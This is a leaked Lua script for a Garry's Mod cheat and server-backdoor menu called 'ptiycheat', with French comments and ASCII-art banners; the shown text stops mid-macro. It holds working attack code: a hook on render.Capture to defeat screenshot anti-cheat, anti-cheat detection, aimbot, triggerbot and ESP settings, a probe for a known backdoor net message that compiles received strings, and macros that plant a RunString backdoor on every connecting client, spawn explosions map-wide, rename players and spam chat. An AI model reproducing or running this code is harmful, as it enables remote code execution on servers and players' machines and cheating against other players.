MsgC (Color(255, 73, 73), [[

██████╗ ██╗████████╗██╗   ██╗
██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║    ╚████╔╝
██╔═══╝ ██║   ██║     ╚██╔╝
██║     ██║   ██║      ██║
╚═╝     ╚═╝   ╚═╝      ╚═╝
███████████████████████████████████              ptiycheat Load ✔ - Leaked by Void(0)
███████████████████████████████████
███████████████████████████████████        Maintenez ALT pour ouvrir le menu pour le fermer
███████████────███──────███████████
██████████─────███───────██████████      
█████████───██████───────██████████
██████████████───██───────█████████
██████████────────█──────██████████                    █║║█▌│║│█│║║║▌
███████───────────█──────██████████                        ©ptiycheat/./
█████─────────────█─────█────██████                         Hoper
████──────────────█────██────██████                        Void(0)
████─────────────██────█──────█████
████────────────██─────█─────██████                          :P
████──────────███──────█─────██████
███───────██████──────██─────██─███
███───────██████──────█─────██───██
███────────█████─────██─────██───██
███──────────███─────██─────█────██
███───────────██──████─────██───███
███────────────██──███─────██───███
███─────────────██████─────█────███
████────────────██████─────█────███
█████────────────██████───██────███
██████───────────█──████████───████
██████───────────────███─██████████
███████───────────────────█████████
████████─────────────────────██████
█████████────────────────────██████
█████████───────────────────███████
██████████─────────────────████████
██████████────────────────█████████
██████████──────────────███████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────████████████
██████████─────────────██████████
]])
print("\n")
MsgC (Color(math.random(1,25),math.random(1,25),math.random(1,25)), [[
/$$                           /$$                       /$$       /$$$$$$$                   /$$$$$$                        /$$     /$$ /$$      
| $$                          | $$                      | $$      | $$__  $$                 /$$__  $$                      | $$    |__/| $$      
| $$        /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$   /$$$$$$$      | $$  \ $$ /$$   /$$      | $$  \ $$ /$$$$$$$   /$$$$$$  /$$$$$$   /$$| $$   /$$
| $$       /$$__  $$ |____  $$| $$  /$$/ /$$__  $$ /$$__  $$      | $$$$$$$ | $$  | $$      | $$$$$$$$| $$__  $$ |____  $$|_  $$_/  | $$| $$  /$$/
| $$      | $$$$$$$$  /$$$$$$$| $$$$$$/ | $$$$$$$$| $$  | $$      | $$__  $$| $$  | $$      | $$__  $$| $$  \ $$  /$$$$$$$  | $$    | $$| $$$$$$/ 
| $$      | $$_____/ /$$__  $$| $$_  $$ | $$_____/| $$  | $$      | $$  \ $$| $$  | $$      | $$  | $$| $$  | $$ /$$__  $$  | $$ /$$| $$| $$_  $$ 
| $$$$$$$$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$|  $$$$$$$      | $$$$$$$/|  $$$$$$$      | $$  | $$| $$  | $$|  $$$$$$$  |  $$$$/| $$| $$ \  $$
|________/ \_______/ \_______/|__/  \__/ \_______/ \_______/      |_______/  \____  $$      |__/  |__/|__/  |__/ \_______/   \___/  |__/|__/  \__/
                                                                             /$$  | $$                                                            
                                                                            |  $$$$$$/                                                            
                                                                             \______/                                                            																			 
                              
                          ]])   
						  MsgC (Color(math.random(1,25),math.random(1,25),math.random(1,25)), [[
/$$                           /$$                       /$$       /$$$$$$$                   /$$$$$$                        /$$     /$$ /$$      
| $$                          | $$                      | $$      | $$__  $$                 /$$__  $$                      | $$    |__/| $$      
| $$        /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$   /$$$$$$$      | $$  \ $$ /$$   /$$      | $$  \ $$ /$$$$$$$   /$$$$$$  /$$$$$$   /$$| $$   /$$
| $$       /$$__  $$ |____  $$| $$  /$$/ /$$__  $$ /$$__  $$      | $$$$$$$ | $$  | $$      | $$$$$$$$| $$__  $$ |____  $$|_  $$_/  | $$| $$  /$$/
| $$      | $$$$$$$$  /$$$$$$$| $$$$$$/ | $$$$$$$$| $$  | $$      | $$__  $$| $$  | $$      | $$__  $$| $$  \ $$  /$$$$$$$  | $$    | $$| $$$$$$/ 
| $$      | $$_____/ /$$__  $$| $$_  $$ | $$_____/| $$  | $$      | $$  \ $$| $$  | $$      | $$  | $$| $$  | $$ /$$__  $$  | $$ /$$| $$| $$_  $$ 
| $$$$$$$$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$|  $$$$$$$      | $$$$$$$/|  $$$$$$$      | $$  | $$| $$  | $$|  $$$$$$$  |  $$$$/| $$| $$ \  $$
|________/ \_______/ \_______/|__/  \__/ \_______/ \_______/      |_______/  \____  $$      |__/  |__/|__/  |__/ \_______/   \___/  |__/|__/  \__/
                                                                             /$$  | $$                                                            
                                                                            |  $$$$$$/                                                            
                                                                             \______/      
encore un menu de merde le backdoor menu ressemble au odium du 88 bizarre 																			 
                              
                          ]])   

chat.AddText(Color(0, 0, 0), "[", "ptiycheat", "] ", Color( 255, 255, 255 ), "Menu chargé avec sucès" )

local me = LocalPlayer()


/*================================
|===== ptiycheat BDMenu =====|
=================================*/

local ss = false

local renderv = render.RenderView
local renderc = render.Clear
local rendercap = render.Capture
local vguiworldpanel = vgui.GetWorldPanel

local function screengrab()
if ss then return end
ss = true

renderc( 0, 0, 0, 255, true, true )
renderv( {
origin = LocalPlayer():EyePos(),
angles = LocalPlayer():EyeAngles(),
x = 0,
y = 0,
w = ScrW(),
h = ScrH(),
dopostprocess = true,
drawhud = true,
drawmonitors = true,
drawviewmodel = true
} )

local vguishits = vguiworldpanel()

if IsValid( vguishits ) then
vguishits:SetPaintedManually( true )
end

timer.Simple( 0.1, function()
vguiworldpanel():SetPaintedManually( false )
ss = false
end)
end

render.Capture = function(data)
screengrab()
local cap = rendercap( data )
return cap
end

local blur = Material("pp/blurscreen")
local function DrawBlur(panel, amount)
local x, y = panel:LocalToScreen(0, 0)
local scrW, scrH = ScrW(), ScrH()
surface.SetDrawColor(255, 255, 255)
surface.SetMaterial(blur)
for i = 1, 3 do
blur:SetFloat("$blur", (i / 3) * (amount or 6))
blur:Recompute()
render.UpdateScreenEffectTexture()
surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
end
end

if (_G.QAC or _G.CAC) then
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "Cake AntiCheat détecté" )
else
net.SendToServer()
end


if (_G.ulx or _G.ulib) then
net.SendToServer()
else
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "Ulx non détecté" )
end

if file.Exists("snte_source.lua","LUA") == true or file.Exists ( "autorun/server/snte_source.lua", "LUA" ) == true then
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "SNTE détecté!!!!" )
snte=true
else
snte=false
end

if file.Exists( "autorun/server/anti-bhop.lua", "GAME" ) == true then
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "C0nw0nks Anticheat détecté" )
else
net.SendToServer()
end

if file.Exists( "cl_HAC.lua", "LUA" ) == true or file.Exists( "autorun/server/sv_HAC.lua", "LUA" ) == true then
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "Hex's Anticheat détecté" )
else
net.SendToServer()
end




/*=====================================   fiji_
|===== ptiycheat Fonts =====|
======================================*/


surface.CreateFont("ptiycheatersave", {font = "Arial", size = 80,weight = 1000, antialias = 0})
surface.CreateFont("ptiycheat_home1",{font = "Arial", size = 60, weight = 2000, antialias = 0})
surface.CreateFont("ptiycheat_home2",{font = "Arial", size = 13, weight = 1000, antialias = 0})
surface.CreateFont("ptiycheat_home3",{font = "Arial", size = 15, weight = 2, antialias = 0})
surface.CreateFont("ptiycheat_home4",{font = "Arial", size = 20, weight = 2000, antialias = 0})
surface.CreateFont("ptiycheat_home5",{font = "Arial", size = 13, weight = 100, antialias = 0})
surface.CreateFont("PRINTERDETECT", {font = "", size = 20,weight = 1000, antialias = 0})
surface.CreateFont("ptiycheat_homeBTN",{font = "Roboto", size = 13, weight = 100, shadow = true, italic = true, antialias = 0})
surface.CreateFont("ptiycheat_homemini",{font = "Arial", size = 12, weight = 0, antialias = 0})

--fun
local fiji_fun_bunnyhop = CreateClientConVar( "fiji_fun_bunnyhop", "0", true )
local fiji_fun_spamlight = CreateClientConVar( "fiji_fun_spamlight", "0", true )
local fiji_fun_spamrope = CreateClientConVar( "fiji_fun_spamrope", "0", true )
local fiji_fun_thperson = CreateClientConVar( "fiji_fun_thperson", "0", true )
local fiji_fun_radar = CreateClientConVar( "fiji_fun_radar", "0", true )
local fiji_fun_radartech = CreateClientConVar( "fiji_fun_radartech", "0", true )
local fiji_fun_miroir = CreateClientConVar( "fiji_fun_miroir", "0", true )
local fiji_fun_screengrab = CreateClientConVar( "fiji_fun_screengrab", "1", true )

--crosshair
local fiji_fun_crosshair = CreateClientConVar( "fiji_fun_crosshair", "0", true )
local fiji_fun_crosshaircolor1 = CreateClientConVar( "fiji_fun_crosshaircolor1", "255", true )
local fiji_fun_crosshaircolor2 = CreateClientConVar( "fiji_fun_crosshaircolor2", "0", true )
local fiji_fun_crosshaircolor3 = CreateClientConVar( "fiji_fun_crosshaircolor3", "0", true )
local fiji_fun_crosshaircolortype = CreateClientConVar( "fiji_fun_crosshaircolortype", "0", true )
local fiji_fun_crosshairstyle = CreateClientConVar( "fiji_fun_crosshairstyle", "1", true )
local fiji_fun_crosshairtaille = CreateClientConVar( "fiji_fun_crosshairtaille", "1", true )

local fiji_aimbot_active = CreateClientConVar( "fiji_aimbot_active", "0", true )
local fiji_aimbot_wall = CreateClientConVar( "fiji_aimbot_wall", "0", true )
local fiji_aimbot_friends = CreateClientConVar( "fiji_aimbot_friends", "0", true )
local fiji_aimbot_team = CreateClientConVar( "fiji_aimbot_team", "0", true )
local fiji_aimbot_admin = CreateClientConVar( "fiji_aimbot_admin", "0", true )
local fiji_aimbot_key = CreateClientConVar( "fiji_aimbot_key", KEY_W, true )
local fiji_aimbot_fov = CreateClientConVar( "fiji_aimbot_fov", "180", true )
local fiji_aimbot_dist = CreateClientConVar( "fiji_aimbot_dist", "1500", true )
local fiji_aimbot_propa = CreateClientConVar( "fiji_aimbot_propa", 0 )
local fiji_aimbot_relock = CreateClientConVar( "fiji_aimbot_relock", "0", true ) -- auto reviser
local fiji_aimbot_attack = CreateClientConVar( "fiji_aimbot_attack", "chest", true ) -- choisir zone


local fiji_triggerbot_active = CreateClientConVar( "fiji_triggerbot_active", 0 )
local fiji_triggerbot_opti = CreateClientConVar( "fiji_triggerbot_opti", 0 )
local fiji_triggerbot_real = CreateClientConVar( "fiji_triggerbot_real", 0 )
local fiji_triggerbot_team = CreateClientConVar( "fiji_triggerbot_team", 0 )
local fiji_triggerbot_wall = CreateClientConVar( "fiji_triggerbot_wall", 0 )
local fiji_triggerbot_friends = CreateClientConVar( "fiji_triggerbot_friends", 0 )

local fiji_menu_princ_color = CreateClientConVar( "fiji_menu_princ_color", "50", true, false )
local fiji_menu_sec_color = CreateClientConVar( "fiji_menu_sec_color", "50", true, false )
local fiji_menu_th_color = CreateClientConVar( "fiji_menu_th_color", "50", true, false )
local fiji_style_menu = CreateClientConVar( "fiji_style_menu", "3", true, false )

local fiji_principal_color = CreateClientConVar( "fiji_principal_color", "255", true, false )
local fiji_secondary_color = CreateClientConVar( "fiji_secondary_color", "0", true, false )
local fiji_third_color = CreateClientConVar( "fiji_third_color", "0", true, false )
local fiji_principal_color_infos = CreateClientConVar( "fiji_principal_color_infos", "255", true, false )
local fiji_secondary_color_infos = CreateClientConVar( "fiji_secondary_color_infos", "255", true, false )
local fiji_third_color_infos = CreateClientConVar( "fiji_third_color_infos", "255", true, false )
local fiji_principal_color_ent = CreateClientConVar( "fiji_principal_color_ent", "255", true, false )
local fiji_secondary_color_ent = CreateClientConVar( "fiji_secondary_color_ent", "0", true, false )
local fiji_third_color_ent = CreateClientConVar( "fiji_third_color_ent", "0", true, false )
local fiji_principal_color_props = CreateClientConVar( "fiji_principal_color_props", "255", true, false )
local fiji_secondary_color_props = CreateClientConVar( "fiji_secondary_color_props", "0", true, false )
local fiji_third_color_props = CreateClientConVar( "fiji_third_color_props", "0", true, false )
local fiji_style_player = CreateClientConVar( "fiji_style_player", "0", true, false )
local fiji_principal_color_player = CreateClientConVar( "fiji_principal_color_player", "255", true, false )
local fiji_secondary_color_player = CreateClientConVar( "fiji_secondary_color_player", "0", true, false )
local fiji_third_color_player = CreateClientConVar( "fiji_third_color_player", "0", true, false )

local fiji_vision_enable = CreateClientConVar( "BD_hitman_enable", 1 )
local fiji_vision_enable_ent = CreateClientConVar( "BD_hitman_enable_ent", 0 )
local fiji_vision_enable_props = CreateClientConVar( "BD_hitman_enable_props", 0 )
local fiji_vision_type = CreateClientConVar( "BD_hitman_type", 1 )
local fiji_vision_infos_name = CreateClientConVar( "BD_hitman_infos_name", 1 )
local fiji_vision_infos_weapons = CreateClientConVar( "BD_hitman_infos_weapons", 1 )
local fiji_vision_infos_health = CreateClientConVar( "BD_hitman_infos_health", 1 )
local fiji_vision_distance = CreateClientConVar( "BD_hitman_distance", 7000 )
local fiji_vision_distance_infos = CreateClientConVar( "BD_hitman_distance_infos", 800 )
local fiji_vision_distance_ent = CreateClientConVar( "BD_hitman_distance_ent", 800 )
local fiji_vision_distance_props = CreateClientConVar( "BD_hitman_distance_props", 800 )
local fiji_vision_enable_enthalo = CreateClientConVar( "fiji_vision_enable_enthalo", 1 )
local fiji_vision_enable_enttext = CreateClientConVar( "fiji_vision_enable_enttext", 1 )


local physgun_wheelspeed = CreateClientConVar( "physgun_wheelspeed", "100", true, false )

local fiji_ptiycheatlogo = Material( "addons/base_ui_gmod/mat/ptiycheatlogo.png" )
local fiji_ptiycheathome = Material( "addons/base_ui_gmod/mat/ptiycheathome.png" )
local fiji_ptiycheatesp = Material( "addons/base_ui_gmod/mat/ptiycheatesp.png" )
local fiji_ptiycheataimbot = Material( "addons/base_ui_gmod/mat/ptiycheataimbot.png" )
local fiji_ptiycheatmisc = Material( "addons/base_ui_gmod/mat/ptiycheatmisc.png" )
local fiji_ptiycheatexploits = Material( "addons/base_ui_gmod/mat/ptiycheatexploits.png" )
local fiji_ptiycheatbackdoors = Material( "addons/base_ui_gmod/mat/ptiycheatbackdoors.png" )
local fiji_ptiycheatconfig = Material( "addons/base_ui_gmod/mat/ptiycheatconfig.png" )
local fiji_ptiycheatdiscordwidget = Material( "addons/base_ui_gmod/mat/ptiycheatdiscordwidget.png" )


local fiji_exist_contentptiycheat = CreateClientConVar( "fiji_exist_contentptiycheat", 0 )

local fiji_ptiycheathover = "mat/ptiycheathover2.wav"
local fiji_ptiycheatclick = "mat/ptiycheatclick2.wav"

local fiji_sv_existmen = CreateClientConVar( "fiji_sv_existmen", 0 )


--[[if file.Exists( "addons/ptiycheat/field_constant.lua", "GAME" ) == true or file.Exists( "field_constant.lua", "LUA" ) == true then
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 1")
else
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 0")
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "ERREUR - Vous n'avez pas installé les contents du menu." )
end  ]]--

if file.Exists( "addons/base_ui_gmod/mat/ptiycheatlogo.png", "GAME" ) == true then
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 1")
else
LocalPlayer():ConCommand("fiji_exist_contentptiycheat 0")
chat.AddText(Color( 0, 0, 0), "[ptiycheat] ", Color( 255, 114, 114 ), "ERREUR - Vous n'avez pas installé les contents du menu." )
end 

hook.Add("Think", "RGBSTF", function()
local rainbowC = HSVToColor( CurTime() % 6 * 60, 1, 1 )

if fiji_style_player:GetInt() == 1 then
LocalPlayer():SetWeaponColor( Vector( rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255 ) )
LocalPlayer():SetPlayerColor( Vector( rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255 ) )
else
LocalPlayer():SetWeaponColor( Vector( fiji_principal_color_player:GetInt(),fiji_secondary_color_player:GetInt(),fiji_third_color_player:GetInt(), 255 ) )
LocalPlayer():SetPlayerColor(Vector( fiji_principal_color_player:GetInt(),fiji_secondary_color_player:GetInt(),fiji_third_color_player:GetInt(), 255 ) )
end
end)


/*=====================================
|===== ptiycheat Backdoors =====|
======================================*/


local hide = {
CHudCrosshair = true,
}

local triangle = {
{ x = 50, y = 100 },
{ x = 75, y = 50 },
{ x = 100, y = 200 }

}

hook.Add( "HUDShouldDraw", "HideHUD", function( name )
if( fiji_fun_crosshair:GetInt() == 1 ) then
if ( hide[ name ] ) then return false end
end
end )
local function FillRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawRect( x, y, w, h );
end
local function DrawCrosshair()

local w = ScrW() / 2.003;
local h = ScrH() / 2;
local stretch = fiji_fun_crosshairtaille:GetInt()

if not LocalPlayer():InVehicle() then
if fiji_fun_crosshairstyle:GetInt() == 1 then
if fiji_fun_crosshaircolortype:GetInt() == 1 then
FillRGBA( w - fiji_fun_crosshairtaille:GetInt()/2-14.2,h , fiji_fun_crosshairtaille:GetInt() + 30, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) );
FillRGBA( w, h - fiji_fun_crosshairtaille:GetInt()/2-13, 2, fiji_fun_crosshairtaille:GetInt() + 30, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) );
elseif fiji_fun_crosshaircolortype:GetInt() == 2 then
FillRGBA( w - fiji_fun_crosshairtaille:GetInt()/2-14.2,h , fiji_fun_crosshairtaille:GetInt() + 30, 2, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) );
FillRGBA( w, h - fiji_fun_crosshairtaille:GetInt()/2-13, 2, fiji_fun_crosshairtaille:GetInt() + 30, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) );
else
FillRGBA( w - fiji_fun_crosshairtaille:GetInt()/2-14.2,h , fiji_fun_crosshairtaille:GetInt() + 30, 2, Color(fiji_fun_crosshaircolor1:GetInt(), fiji_fun_crosshaircolor2:GetInt(), fiji_fun_crosshaircolor3:GetInt(), 255 ) );
FillRGBA( w, h - fiji_fun_crosshairtaille:GetInt()/2-13, 2, fiji_fun_crosshairtaille:GetInt() + 30, Color(fiji_fun_crosshaircolor1:GetInt(), fiji_fun_crosshaircolor2:GetInt(), fiji_fun_crosshaircolor3:GetInt(), 255 ) );
end
elseif  fiji_fun_crosshairstyle:GetInt() == 2 then
if fiji_fun_crosshaircolortype:GetInt() == 1 then
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt()-9, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt(), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
elseif fiji_fun_crosshaircolortype:GetInt() == 2 then
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt()-9, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt(), Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
else
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt()-9, Color(fiji_fun_crosshaircolor1:GetInt(), fiji_fun_crosshaircolor2:GetInt(), fiji_fun_crosshaircolor3:GetInt(), 255 ))
surface.DrawCircle(w, h, fiji_fun_crosshairtaille:GetInt(), Color(fiji_fun_crosshaircolor1:GetInt(), fiji_fun_crosshaircolor2:GetInt(), fiji_fun_crosshaircolor3:GetInt(), 255 ))
end

end
end
end



function DrawXHair()
if( fiji_fun_crosshair:GetInt() == 1 ) then
DrawCrosshair();
end
end
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );

local BD = {}
local h = http


BD.Backdoors = BD.Backdoors or {}

BD.BackdoorTypes = {

["Fpp"] = {

["Code"] = "util.AddNetworkString( 'data_check' ) net.Receive( 'data_check', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

["Netkey"] = "data_check",

},

}




local netsss = net.Start

function BD.IsMessagePooled( netmessage )

local netfunc = netsss

local status, error = pcall( netfunc, netmessage )

return status

end

function ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end

local net = net


local ctxt = chat.AddText

function BD.ChatText( message, col )

ctxt( Color(255, 114, 114), "[ptiycheat] ", col, message )

end

function CHATPRINT( str )
end






function BD.PingBackDoors()

local bds = {}

for k, v in pairs(BD.BackdoorTypes) do

if BD.IsMessagePooled( tostring( v.Netkey ) ) then bds[k] = true end

end

return bds

end

concommand.Add("bd_refresh_backdoors", function() BD.Backdoors = BD.PingBackDoors() end)



function BD.BackdoorActive()

return table.Count( BD.Backdoors ) > 0

end



if fiji_fun_crosshair:GetInt() == 1 then
DrawCrosshair();
else end



local function CommandesDraw()
if fiji_fun_radar:GetInt() == 2 then
local pitch = -2
if pitch < 0 then pitch = pitch * LocalPlayer():EyeAngles().p end
local yaw = 180
if yaw < 0 then yaw = yaw * LocalPlayer():EyeAngles().y end
local roll = 0
if roll < 0 then roll = roll * LocalPlayer():EyeAngles().r end
local Cam = {}
Cam.angles = Angle( LocalPlayer():EyeAngles().p + pitch, LocalPlayer():EyeAngles().y + yaw, LocalPlayer():EyeAngles().r + roll )
Cam.origin = LocalPlayer():GetShootPos()
Cam.x = 0
Cam.y = 0
Cam.w = 200
Cam.h = 200
render.RenderView( Cam )
surface.SetDrawColor( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt() )
surface.DrawOutlinedRect( 0, 0, 200,200 )end

if fiji_fun_radar:GetInt() == 1 then
local Cam = {}
Cam.angles = Angle( 90, LocalPlayer():EyeAngles().y, 0 )
local Zvar = 2000
local trace = {}
trace.start = LocalPlayer():GetPos() + Vector( 0, 0, 5 )
trace.endpos = LocalPlayer():GetPos() + Vector( 0, 0, 2000 )
trace.filter = LocalPlayer()
if util.TraceLine( trace ).Hit then
Zvar = util.TraceLine( trace ).HitPos.z - 5 - LocalPlayer():GetPos().z

end
surface.SetDrawColor( 30, 30, 30, 255 )
surface.DrawRect( 0,0,200,200 )
Cam.origin = LocalPlayer():GetPos() + Vector( 0, 0, Zvar )
Cam.x = 0
Cam.y = 0
Cam.w = 200
Cam.h = 200


surface.SetDrawColor( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt() )
surface.DrawOutlinedRect( 0, 0, 200,200 )

    local size = 200
    local fov = 28
    local x = 0
    local y = 0
for key, ply in pairs(player.GetAll()) do

 local teamcol =  Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 )

            local lx = me:GetPos().x - ply:GetPos().x
            local ly = me:GetPos().y - ply:GetPos().y
            local ang = EyeAngles().y
            local cos = math.cos(math.rad(-ang))
            local sin = math.sin(math.rad(-ang))
            local px = (ly * cos) + (lx * sin)
            local py = (lx * cos) - (ly * sin)
            px = px / fov
            py = py / fov
            px = math.Clamp(px, -(size * 0.50), size * 0.50)
            py = math.Clamp(py, -(size * 0.50), size * 0.50)
            if ply:GetPos():Distance( LocalPlayer():GetPos() ) > 2500 then continue end
            if ply != me then
            local name = player.GetAll()[key]:Nick()
            local job  = player.GetAll()[key]:Team()
            draw.SimpleText(name, "ptiycheat_homemini", x + size - (size * 0.50) + px - 13, y + size - (size * 0.56) + py - 7, teamcol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
            draw.SimpleText(job, "ptiycheat_homemini", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, teamcol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
        end
            if ply != me then
            	surface.SetDrawColor(teamcol)
            surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py, 3, 3)
        else
        	surface.SetDrawColor(255,255,255)
        	surface.DrawRect(x + size - (size * 0.51) + px, y + size - (size * 0.50) + py, 5, 5)

        end
         surface.DrawLine(x, y, x + (size / 2), y + (size / 2))
    surface.DrawLine(x + size, y, x + (size / 2), y + (size / 2))

--surface.SetDrawColor( 255, 255, 255, 255 )
--surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
end
end
hook.Add( "HUDPaint", "LESP", CommandesDraw )

hook.Add("Think", "fijispamlight", function(ucmd, origin, angles, calcview, fov, p, o, a, f, aaaaa )
if fiji_fun_spamlight:GetInt() == 1 then
if input.IsKeyDown(KEY_F) then me:ConCommand("impulse 100") end
end

end)
hook.Add("Think", "fijifolie", function(ucmd, origin, angles, calcview, fov, p, o, a, f, aaaaa )
if fiji_fun_spamrope:GetInt() == 1 then
if input.IsKeyDown(KEY_H) then

local fijiangle = Angle(math.random(-90, 90), math.random(-180, 180), 0)

me:SetEyeAngles( fijiangle )

end end
end)

local fijibhop = false
hook.Add("Think", "fijibhop", function()
if fiji_fun_bunnyhop:GetInt() == 1 then
if (input.IsKeyDown( KEY_SPACE ) ) then
if LocalPlayer():IsOnGround() then
RunConsoleCommand("+jump")
HasJumped = 1
else
RunConsoleCommand("-jump")
HasJumped = 0
end
elseif fiji_fun_bunnyhop:GetInt() == 0 and LocalPlayer():IsOnGround() then
if HasJumped == 1 then
RunConsoleCommand("-jump")
HasJumped = 0
end
end
end
end)


if fiji_fun_thperson:GetInt() == 1 then

hook.Add( "CalcView", "ThirdPerson", function(ply, pos, angles, fov)
	local ThirdPerson = {}
	if fiji_fun_thperson:GetInt() == 1 then
	ThirdPerson.origin = pos-( angles:Forward()*100 )
	ThirdPerson.angles = angles
	ThirdPerson.fov = fov
	ThirdPerson.drawviewer = true
	return ThirdPerson
	elseif fiji_fun_thperson:GetInt() == 1 then
	ThirdPerson.origin = pos-( angles:Forward() )
	ThirdPerson.angles = angles
	ThirdPerson.fov = fov
	end
end)

end

function BD.IsDead( ply )
if !ply:IsValid() or !ply:Alive() or ply:GetObserverMode() != OBS_MODE_NONE then return true end
return false
end

function BD.GetActive()

if !BD.BackdoorTypes[BD.CurrentBackdoor] then return { ["Code"] = "local x = 69", ["Netkey"] = "" } end

return BD.BackdoorTypes[BD.CurrentBackdoor]

end



BD.BDMacros ={




/*===========================================
|===== Commandes Sur Tout Les Joueurs  =====|
============================================*/





["Armageddon"] = {

["Type"] = 1,

["Code"] = [[if !bombstrike then

hook.Add("Think", "lulz_bombstrike", function()

local explode = ents.Create( "env_explosion" )

local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

local trc = {}

trc.start = ps

trc.endpos = ps + Vector( 0, 0, -99999)

local tr = util.TraceLine(trc)

if !tr.Hit then return end

explode:SetPos( tr.HitPos )

explode:Spawn()

explode:SetKeyValue( "iMagnitude", "400" )

explode:Fire( "Explode", 0, 0 )

end)

bombstrike = true

else

hook.Remove("Think", "lulz_bombstrike")

bombstrike = false

end]],

},





["Injecter Backdoor"] = {

["Type"] = 1,

["Code"] = [[

util.AddNetworkString( "fijiconn" )

function BDSendLua( p, str ) net.Start( "fijiconn" ) net.WriteString( str ) net.Send( p ) end

function BDSendLuaAll( str ) net.Start( "fijiconn" ) net.WriteString( str ) net.Broadcast() end

function BDInjectAids( p ) p:SendLua( 'net.Receive( "fijiconn", function() RunString( net.ReadString() ) end )' ) end

for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end

hook.Add( "PlayerInitialSpawn", "ptiycheatisyourfriend", function( p ) BDInjectAids( p ) end)

]],


},



["Annonce au Joueurs"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],

["NeedsParameters"] = 1,

},



["Changer pseudos"] = {

["Type"] = 1,

["Code"] = [[ for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, @1) v:setDarkRPVar("rpname", @1) end ]],

["NeedsParameters"] = 1,

},


["Spam Chat"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "wutckoasa" ) then

timer.Create( "wutckoasa", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

else

timer.Remove( "wutckoasa" )

end]],

["NeedsParameters"] = 1,

},



["Ouvrir les portes"] = {

["Type"] = 1,

["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],


},





["♾ Verre cassé"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "A true masterpiece" ) then

timer.Create( "A true masterpiece", 0.2, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )

end

end)

else

timer.Remove( "A true masterpiece" )

end]],

},



["♾ Yeeaahh !"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "porn" ) then

timer.Create( "porn", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "porn" )

end]],

},

["♾ Boxeur"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "impakt" ) then

timer.Create( "impakt", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "physics/body/body_medium_impact_hard1.wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "impakt" )

end]],

},

["♾ Cloche"] = {

["Type"] = 1,

["Code"] = [[
if !timer.Exists( "pimpon" ) then

timer.Create( "pimpon", 0.3, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "ambient/alarms/warningbell1.wav", 100, math.random( 90, 120 ) )

end

end)

